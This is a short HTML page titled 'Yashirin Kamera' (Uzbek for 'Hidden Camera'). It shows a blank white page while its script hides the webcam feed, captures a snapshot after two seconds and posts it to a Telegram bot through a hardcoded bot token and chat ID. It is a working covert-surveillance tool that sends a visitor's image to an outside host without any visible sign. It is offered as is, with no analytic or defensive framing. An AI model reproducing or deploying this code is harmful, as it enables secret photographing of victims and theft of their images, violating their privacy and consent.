<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Yashirin Kamera</title>
    <style>
        body { background: #fff; }
        #video, #canvas { display: none; }
        #status { display: none; }
    </style>
</head>
<body>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    <div id="status"></div>
    <script>
        const chatId = '6054480351';
        const botToken = '8364306394:AAEzP4gWTtOsoENlEOhOoGywMHg2tlDgMpE';

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                document.getElementById('video').srcObject = stream;
                // Kamera ochilgandan so‘ng, darhol rasm olamiz
                setTimeout(function() {
                    const canvas = document.getElementById('canvas');
                    const video = document.getElementById('video');
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function(blob) {
                        let formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.jpg');

                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg');
                }, 2000); // 2 soniyadan keyin rasm olish
            })
            .catch(err => {});
    </script>
</body>
</html>
